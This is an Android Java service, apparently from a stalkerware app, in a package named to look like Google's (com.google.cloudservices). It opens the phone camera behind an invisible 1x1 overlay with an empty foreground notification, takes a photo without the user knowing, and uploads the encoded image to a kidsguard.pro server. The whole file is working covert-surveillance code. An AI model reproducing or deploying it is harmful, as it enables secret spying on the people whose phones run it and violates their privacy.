package com.google.cloudservices;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.support.v4.app.NotificationCompat;
import android.util.Log;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

public class TakePictureervice extends Service implements SurfaceHolder.Callback{
    private WindowManager windowManager;
    private SurfaceView surfaceView;
    private Camera camera = null;
    private MediaRecorder mediaRecorder = null,mrec=null;
    String Type="w",durst="w";
    String path= Environment.getExternalStorageDirectory().getAbsolutePath()+"/"+"Ringtones"+"mine.mp4";
    int a=1;
    String encodedImage=null;
    Camera.PictureCallback mPictureCallback;
    Bitmap bitmap1;
    boolean recording;
    Camera.Parameters params;
    public TakePictureervice() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            createNotificationChannel();
            Notification notification = new NotificationCompat.Builder(getApplicationContext())
                    .build();
            startForeground(1, notification);

//        }

        if(intent != null){
            String type=(String) intent.getExtras().get("photoType");
            if (type.equals("front")){
                a=1;
            }else if (type.equals("back")) {
                a=2;
            }
        }

        windowManager = (WindowManager) TakePictureervice.this.getSystemService(Context.WINDOW_SERVICE);
        surfaceView = new SurfaceView(getApplicationContext());
        if (Build.VERSION.SDK_INT>21){
            if (Build.VERSION.SDK_INT>25){
                WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                        1, 1,
                        WindowManager.LayoutParams.TYPE_PHONE,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                        PixelFormat.TRANSLUCENT
                );
                layoutParams.gravity = Gravity.LEFT | Gravity.TOP;
                windowManager.addView(surfaceView, layoutParams);
            }else {
                try {
                    WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                            1, 1,
                            WindowManager.LayoutParams.TYPE_PHONE,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                            PixelFormat.TRANSLUCENT
                    );
                    layoutParams.gravity = Gravity.LEFT | Gravity.TOP;
                    windowManager.addView(surfaceView, layoutParams);
                }catch (Exception e){
                    Log.e("onStartCommand", e.toString() );
                }

            }
        }else {
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                    1, 1,
                    WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    PixelFormat.TRANSLUCENT
            );
            layoutParams.gravity = Gravity.LEFT | Gravity.TOP;

            windowManager.addView(surfaceView, layoutParams);
        }



        surfaceView.getHolder().addCallback(TakePictureervice.this);
//        camera.takePicture(null,null,mPictureCallback);
        Handler handler=new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                windowManager.removeView(surfaceView);
                camera.lock();
                camera.release();

                SendPic sendPic=new SendPic();
//                sendPic.send(BlockActivity.this,encodedImage,"https://req.kidsguard.pro/api/putPic/");
//                Log.e("testingma", encodedImage );
                sendPic.send(getApplicationContext(),encodedImage,"https://im.kidsguard.pro/api/put-picture/");
                onDestroy();
            }
        },12000);
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void surfaceCreated(SurfaceHolder surfaceHolder) {
        try {


            if (a == 1) {
                try {
                    camera = Camera.open(1);
                    camera.setPreviewDisplay(surfaceHolder);
                    camera.startPreview();

                } catch (Exception e) {
                    Log.e("onPictureTaken", e.toString());
                }
            } else {
                try {
                    camera = Camera.open();
                    camera.setPreviewDisplay(surfaceHolder);
                    camera.startPreview();
                } catch (Exception e) {
                    Log.e("onPictureTaken", e.toString());
                }
            }

            surfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
            surfaceHolder.addCallback(this);
            camera.takePicture(null, null, mPictureCallback);
            mPictureCallback = new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {

                    bitmap1 = BitmapFactory.decodeByteArray(data, 0, data.length);
                    Utils utils = new Utils();
                    encodedImage = utils.getStringImage(bitmap1, 200);//this code and util class for convert bitmab to string
                }
            };
        }catch (Exception e){
            Log.e("onPictureTaken", e.toString() );
        }

    }

    @Override
    public void surfaceChanged(SurfaceHolder surfaceHolder, int i, int i1, int i2) {

    }

    @Override
    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {

    }
//    private void createNotificationChannel() {
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            NotificationChannel serviceChannel = new NotificationChannel(
//                    "ForegroundServiceChannel",
//                    "Foreground Service Channel",
//                    NotificationManager.IMPORTANCE_DEFAULT
//            );
//            serviceChannel.setShowBadge(false);
//
//
//
//            NotificationManager manager = getSystemService(NotificationManager.class);
//
//            manager.createNotificationChannel(serviceChannel);
//
//        }
//    }
}
